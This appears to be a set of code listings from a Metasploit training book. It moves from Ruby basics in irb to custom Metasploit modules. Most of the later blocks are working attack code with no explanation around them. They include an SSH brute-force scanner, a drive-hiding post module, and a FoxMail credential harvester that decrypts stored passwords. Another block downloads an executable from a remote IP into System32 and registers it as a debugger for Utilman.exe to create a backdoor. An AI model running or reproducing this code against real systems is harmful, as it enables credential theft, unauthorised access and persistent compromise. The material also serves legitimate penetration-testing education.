["```\nirb(main):001:0> 2\n=> 2   \n```", "```\nirb(main):002:0> 2+3\n=> 5  \n```", "```\nirb(main):005:0> a= \"nipun\"\n=> \"nipun\"\nirb(main):006:0> b= \"loves Metasploit\"\n=> \"loves metasploit\"  \n```", "```\nirb(main):014:0> a\n=> \"nipun\"\nirb(main):015:0> a+b\n=> \"nipun loves metasploit\"  \n```", "```\ndef method_name [( [arg [= default]]...[, * arg [, &expr ]])]\nexpr\nend  \n```", "```\nirb(main):002:0> def xorops(a,b)\nirb(main):003:1> res = a ^ b\nirb(main):004:1> return res\nirb(main):005:1> end\n=> :xorops  \n```", "```\nirb(main):006:0> xorops(90,147)\n=> 201  \n```", "```\nprint_good(\"Example of Print Good\") \nprint_status(\"Example of Print Status\") \nprint_error(\"Example of Print Error\") \n```", "```\n[+] Example of Print Good\n[*] Example of Print Status\n[-] Example of Print Error  \n```", "```\nirb(main):005:0> name = 'Msf Book'\n=> \"Msf Book\"\nirb(main):006:0> name = 'Msf's Book'\nirb(main):007:0' '  \n```", "```\nirb(main):007:0> a = \"Nipun\" \n=> \"Nipun\" \nirb(main):008:0> a << \" loves\" \n=> \"Nipun loves\" \nirb(main):009:0> a << \" Metasploit\" \n=> \"Nipun loves Metasploit\" \nirb(main):010:0> a\n=> \"Nipun loves Metasploit\" \nirb(main):011:0> b = \" and plays counter strike\" \n=> \" and plays counter strike\" \nirb(main):012:0> a+b \n=> \"Nipun loves Metasploit and plays counter strike\"  \n```", "```\nirb(main):001:0> a= \"12345678\"\n=> \"12345678\"\nirb(main):002:0> a[0,2]\n=> \"12\"\nirb(main):003:0> a[2,2]\n=> \"34\"  \n```", "```\nirb(main):001:0> a = \"mastering,metasploit\"\n=> \"mastering,metasploit\"\nirb(main):002:0> b = a.split(\",\")\n=> [\"mastering\", \"metasploit\"]\nirb(main):003:0> b[0]\n=> \"mastering\"\nirb(main):004:0> b[1]\n=> \"metasploit\"  \n```", "```\nirb(main):006:0> b=\"55\"\n=> \"55\"\nirb(main):007:0> b+10\nTypeError: no implicit conversion of Fixnum into String\n        from (irb):7:in `+'\n        from (irb):7\n        from C:/Ruby200/bin/irb:12:in `<main>'\nirb(main):008:0> b.to_i+10\n=> 65\nirb(main):009:0> a=10\n=> 10\nirb(main):010:0> b=\"hello\"\n=> \"hello\"\nirb(main):011:0> a+b\nTypeError: String can't be coerced into Fixnum\n        from (irb):11:in `+'\n        from (irb):11\n        from C:/Ruby200/bin/irb:12:in `<main>'\nirb(main):012:0> a.to_s+b\n=> \"10hello\"  \n```", "```\nirb(main):021:0> a= \"10\"\n=> \"10\"\nirb(main):022:0> a.hex\n=> 16\n```", "```\nirb(main):028:0> 16.to_s(16)\n=> \"10\"\n```", "```\nirb(main):028:0> zero_to_nine= 0..9\n=> 0..9\nirb(main):031:0> zero_to_nine.include?(4)\n=> true\nirb(main):032:0> zero_to_nine.include?(11)\n=> false\nirb(main):002:0> zero_to_nine.each{|zero_to_nine| print(zero_to_nine)}\n0123456789=> 0..9\nirb(main):003:0> zero_to_nine.min\n=> 0\nirb(main):004:0> zero_to_nine.max\n=> 9\n```", "```\nirb(main):005:0> name = [\"nipun\",\"metasploit\"]\n=> [\"nipun\", \"metasploit\"]\nirb(main):006:0> name[0]\n=> \"nipun\"\nirb(main):007:0> name[1]\n=> \"metasploit\"  \n```", "```\ndef print_data(par1) \nsquare = par1*par1 \nreturn square \nend \nanswer = print_data(50) \nprint(answer)  \n```", "```\nirb(main):001:0> 1 > 2\n=> false  \n```", "```\nirb(main):005:0> \"Nipun\" == \"nipun\"\n=> false\nirb(main):006:0> \"Nipun\" == \"Nipun\"\n=> true  \n```", "```\ndef find_match(a) \nif a =~ /Metasploit/ \nreturn true \nelse \nreturn false \nend \nend \n# Main Starts Here \na = \"1238924983Metasploitduidisdid\" \nbool_b=find_match(a) \nprint bool_b.to_s \n```", "```\nC:\\Ruby23-x64\\bin>ruby.exe a.rb\ntrue\n```", "```\ndef forl(a) \nfor i in 0..a \nprint(\"Number #{i}n\") \nend \nend \nforl(10) \n```", "```\ndef each_example(a) \na.each do |i| \nprint i.to_s + \"t\" \nend \nend \n# Main Starts Here \na = Array.new(5) \na=[10,20,30,40,50] \neach_example(a) \n```", "```\nirb(main):001:0> n = \"Hello world\"\n=> \"Hello world\"\nirb(main):004:0> r = /world/\n=> /world/\nirb(main):005:0> r.match n\n=> #<MatchData \"world\">\nirb(main):006:0> n =~ r\n=> 6  \n```", "```\nirb(main):007:0> r = /^world/\n=> /^world/\nirb(main):008:0> n =~ r\n=> nil\nirb(main):009:0> r = /^Hello/\n=> /^Hello/\nirb(main):010:0> n =~ r\n=> 0\nirb(main):014:0> r= /world$/\n=> /world$/\nirb(main):015:0> n=~ r\n=> 6\n```", "```\nrequire 'msf/core' \n\nclass MetasploitModule < Msf::Auxiliary \n  def initialize(info = {}) \n    super(update_info(info, \n      'Name'           => 'Module name', \n      'Description'    => %q{ \n        Say something that the user might want to know. \n      }, \n      'Author'         => [ 'Name' ], \n      'License'        => MSF_LICENSE \n    )) \n  end \n  def run \n    # Main function \n  end \nend \n```", "```\n## \n# This module requires Metasploit: https://metasploit.com/download \n# Current source: https://github.com/rapid7/metasploit-framework \n## \nrequire 'rex/proto/http' \nclass MetasploitModule < Msf::Auxiliary \n```", "```\n  # Exploit mixins should be called first \n  include Msf::Exploit::Remote::HttpClient \n  include Msf::Auxiliary::WmapScanServer \n  # Scanner mixin should be near last \n  include Msf::Auxiliary::Scanner \n```", "```\ndef initialize \n  super( \n    'Name'        => 'HTTP Version Detection', \n    'Description' => 'Display version information about each system', \n    'Author'      => 'hdm', \n    'License'     => MSF_LICENSE \n  ) \n\n  register_wmap_options({ \n      'OrderID' => 0, \n      'Require' => {}, \n    }) \nend \n```", "```\n# Fingerprint a single host \n  def run_host(ip) \n    begin \n      connect \n      res = send_request_raw({ 'uri' => '/', 'method' => 'GET' }) \n      fp = http_fingerprint(:response => res) \n      print_good(\"#{ip}:#{rport} #{fp}\") if fp \n      report_service(:host => rhost, :port => rport, :sname => (ssl ? 'https' : 'http'), :info => fp) \n    rescue ::Timeout::Error, ::Errno::EPIPE \n    ensure \n      disconnect \n    end \n  end \nend \n```", "```\nclass MetasploitModule < Msf::Auxiliary \n  include Msf::Exploit::Remote::Ftp \n  include Msf::Auxiliary::Scanner \n  include Msf::Auxiliary::Report \n  def initialize \n    super( \n      'Name'        => 'FTP Version Scanner Customized Module', \n      'Description' => 'Detect FTP Version from the Target', \n      'Author'      => 'Nipun Jaswal', \n      'License'     =>  MSF_LICENSE \n    ) \n\n    register_options( \n      [ \n        Opt::RPORT(21), \n      ]) \n  end \n```", "```\ndef run_host(target_host) \n     connect(true, false) \n    if(banner) \n    print_status(\"#{rhost} is running #{banner}\") \n    report_service(:host => rhost, :port => rport, :name => \"ftp\", :info => banner) \n    end \n    disconnect \n  end \nend \n```", "```\nrequire 'metasploit/framework/credential_collection' \nrequire 'metasploit/framework/login_scanner/ssh' \n\nclass MetasploitModule < Msf::Auxiliary \n\n  include Msf::Auxiliary::Scanner \n  include Msf::Auxiliary::Report \n  include Msf::Auxiliary::AuthBrute \n\n  def initialize \n    super( \n      'Name'        => 'SSH Scanner', \n      'Description' => %q{ \n        My Module. \n      }, \n      'Author'      => 'Nipun Jaswal', \n      'License'     => MSF_LICENSE \n    ) \n\n    register_options( \n      [ \n        Opt::RPORT(22) \n      ]) \n  end \n```", "```\ndef run_host(ip) \n    cred_collection = Metasploit::Framework::CredentialCollection.new( \n      blank_passwords: datastore['BLANK_PASSWORDS'], \n      pass_file: datastore['PASS_FILE'], \n      password: datastore['PASSWORD'], \n      user_file: datastore['USER_FILE'], \n      userpass_file: datastore['USERPASS_FILE'], \n      username: datastore['USERNAME'], \n      user_as_pass: datastore['USER_AS_PASS'], \n    ) \n\n    scanner = Metasploit::Framework::LoginScanner::SSH.new( \n      host: ip, \n      port: datastore['RPORT'], \n      cred_details: cred_collection, \n      proxies: datastore['Proxies'], \n      stop_on_success: datastore['STOP_ON_SUCCESS'], \n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'], \n      connection_timeout: datastore['SSH_TIMEOUT'], \n      framework: framework, \n      framework_module: self, \n    ) \n```", "```\n   scanner.scan! do |result| \n      credential_data = result.to_h \n      credential_data.merge!( \n          module_fullname: self.fullname, \n          workspace_id: myworkspace_id \n      ) \n         if result.success? \n        credential_core = create_credential(credential_data) \n        credential_data[:core] = credential_core \n        create_credential_login(credential_data) \n        print_good \"#{ip} - LOGIN SUCCESSFUL: #{result.credential}\" \n         else \n        invalidate_login(credential_data) \n        print_status \"#{ip} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\" \n         end \n   end \nend \nend \n```", "```\nrequire 'rex' \nrequire 'msf/core/post/windows/registry' \nclass MetasploitModule < Msf::Post \n  include Msf::Post::Windows::Registry \n  def initialize \n    super( \n        'Name'          => 'Drive Disabler', \n        'Description'   => 'This Modules Hides and Restrict Access to a Drive', \n        'License'       => MSF_LICENSE, \n        'Author'        => 'Nipun Jaswal' \n      ) \n    register_options( \n      [ \n        OptString.new('DriveName', [ true, 'Please SET the Drive Letter' ]) \n      ]) \n  end     \n```", "```\ndef run \ndrive_int = drive_string(datastore['DriveName']) \nkey1=\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" \n\nexists = meterpreter_registry_key_exist?(key1) \nif not exists \nprint_error(\"Key Doesn't Exist, Creating Key!\") \nregistry_createkey(key1) \nprint_good(\"Hiding Drive\") \nmeterpreter_registry_setvaldata(key1,'NoDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) \nprint_good(\"Restricting Access to the Drive\") \nmeterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) \nelse \nprint_good(\"Key Exist, Skipping and Creating Values\") \nprint_good(\"Hiding Drive\") \nmeterpreter_registry_setvaldata(key1,'NoDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) \nprint_good(\"Restricting Access to the Drive\") \nmeterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) \nend \nprint_good(\"Disabled #{datastore['DriveName']} Drive\") \nend \n```", "```\nmeterpreter_registry_setvaldata(key1,'NoViewOnDrives',drive_int.to_s,'REG_DWORD',REGISTRY_VIEW_NATIVE) \n```", "```\ndef drive_string(drive) \ncase drive \nwhen \"A\" \nreturn 1 \n\nwhen \"B\" \nreturn 2 \n\nwhen \"C\" \nreturn 4 \n\nwhen \"D\" \nreturn 8 \n\nwhen \"E\" \nreturn 16 \nend \nend \nend \n```", "```\nclass MetasploitModule < Msf::Post \n  include Msf::Post::Windows::Registry \n  include Msf::Post::File \n  include Msf::Auxiliary::Report \n  include Msf::Post::Windows::UserProfiles \n\n  def initialize(info={}) \n    super(update_info(info, \n      'Name'          => 'FoxMail 6.5 Credential Harvester', \n      'Description'   => %q{ \nThis Module Finds and Decrypts Stored Foxmail 6.5 Credentials \n      }, \n      'License'       => MSF_LICENSE, \n      'Author'        => ['Nipun Jaswal'], \n      'Platform'      => [ 'win' ], \n      'SessionTypes'  => [ 'meterpreter' ] \n    )) \n  end \n```", "```\ndef run \n  profile = grab_user_profiles() \n  counter = 0 \n  data_entry = \"\" \n  profile.each do |user| \n  if user['LocalAppData'] \n  full_path = user['LocalAppData'] \n  full_path = full_path+\"\\VirtualStore\\Program Files (x86)\\Tencent\\Foxmail\\mail\" \n  if directory?(full_path) \n  print_good(\"Fox Mail Installed, Enumerating Mail Accounts\") \n  session.fs.dir.foreach(full_path) do |dir_list| \n  if dir_list =~ /@/ \n  counter=counter+1 \n  full_path_mail = full_path+ \"\\\" + dir_list + \"\\\" + \"Account.stg\" \n  if file?(full_path_mail) \n  print_good(\"Reading Mail Account #{counter}\") \n  file_content = read_file(full_path_mail).split(\"n\") \n```", "```\n  file_content.each do |hash| \n  if hash =~ /POP3Password/ \n  hash_data = hash.split(\"=\") \n  hash_value = hash_data[1] \n  if hash_value.nil? \n  print_error(\"No Saved Password\") \n  else \n  print_good(\"Decrypting Password for mail account: #{dir_list}\")  \n  decrypted_pass = decrypt(hash_value,dir_list) \n  data_entry << \"Username:\" +dir_list + \"t\" + \"Password:\" + decrypted_pass+\"n\" \n  end \n  end \n  end \n  end \n  end \n  end \n  end \n  end \n  end \n  store_loot(\"Foxmail Accounts\",\"text/plain\",session,data_entry,\"Fox.txt\",\"Fox Mail Accounts\") \n  end \n```", "```\ndef decrypt(hash_real,dir_list) \n  decoded = \"\" \n  magic = Array[126, 100, 114, 97, 71, 111, 110, 126] \n  fc0 = 90 \n  size = (hash_real.length)/2 - 1 \n  index = 0 \n  b = Array.new(size) \n  for i in 0 .. size do \n  b[i] = (hash_real[index,2]).hex  \n  index = index+2 \n  end \n  b[0] = b[0] ^ fc0 \n  double_magic = magic+magic \n  d = Array.new(b.length-1) \n  for i in 1 .. b.length-1 do \n  d[i-1] = b[i] ^ double_magic[i-1] \n  end \n  e = Array.new(d.length) \n  for i in 0 .. d.length-1 \n  if (d[i] - b[i] < 0) \n  e[i] = d[i] + 255 - b[i] \n  else \n  e[i] = d[i] - b[i] \n  end \n  decoded << e[i].chr \n  end \n  print_good(\"Found Username #{dir_list} with Password: #{decoded}\") \n  return decoded \n  end \n  end \n```", "```\n#Admin Check \nprint_status(\"Checking If the Current User is Admin\") \nadmin_check = is_admin? \nif(admin_check) \nprint_good(\"Current User Is Admin\") \nelse \nprint_error(\"Current User is Not Admin\") \nend \n```", "```\n#User Group Check \nuser_check = is_in_admin_group? \nif(user_check) \nprint_good(\"Current User is in the Admin Group\") \nelse \nprint_error(\"Current User is Not in the Admin Group\") \nend \n```", "```\n\n#Process Id Of the Explorer.exe Process \ncurrent_pid = session.sys.process.getpid \nprint_status(\"Current PID is #{current_pid}\") \nsession.sys.process.get_processes().each do |x| \nif x['name'].downcase == \"explorer.exe\" \nprint_good(\"Explorer.exe Process is Running with PID #{x['pid']}\") \nexplorer_ppid = x['pid'].to_i \n# Migration to Explorer.exe Process \nsession.core.migrate(explorer_ppid) \ncurrent_pid = session.sys.process.getpid \nprint_status(\"Current PID is #{current_pid}\") \nend \nend  \n```", "```\n# Finding the Current User \nprint_status(\"Getting the Current User ID\") \ncurrentuid = session.sys.config.getuid \nprint_good(\"Current Process ID is #{currentuid}\") \n```", "```\n#Checking if UAC is Enabled \nuac_check = is_uac_enabled? \nif(uac_check) \nprint_error(\"UAC is Enabled\") \nuac_level = get_uac_level \nif(uac_level = 5) \nprint_status(\"UAC level is #{uac_level.to_s} which is Default\") \nelsif (uac_level = 2) \nprint_status(\"UAC level is #{uac_level.to_s} which is Always Notify\") \nelse \nprint_error(\"Some Error Occured\") \nend \nelse \nprint_good(\"UAC is Disabled\") \nend \n```", "```\nclient.railgun.DLLname.function(parameters) \n```", "```\nclient.railgun.netapi32.NetUserDel(arg1,agr2) \n```", "```\nif client.railgun.get_dll('urlmon') == nil \nprint_status(\"Adding Function\") \nend \nclient.railgun.add_dll('urlmon','C:\\WINDOWS\\system32\\urlmon.dll') \nclient.railgun.add_function('urlmon','URLDownloadToFileA','DWORD',[ \n[\"DWORD\",\"pcaller\",\"in\"], \n[\"PCHAR\",\"szURL\",\"in\"], \n[\"PCHAR\",\"szFileName\",\"in\"], \n[\"DWORD\",\"Reserved\",\"in\"], \n[\"DWORD\",\"lpfnCB\",\"in\"], \n]) \n```", "```\nclient.railgun.urlmon.URLDownloadToFileA(0,\"http://192.168.1.10 /A43.exe\",\"C:\\Windows\\System32\\a43.exe\",0,0) \nkey=\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe\" \nsyskey=registry_createkey(key) \nregistry_setvaldata(key,'Debugger','a43.exe','REG_SZ') \n```"]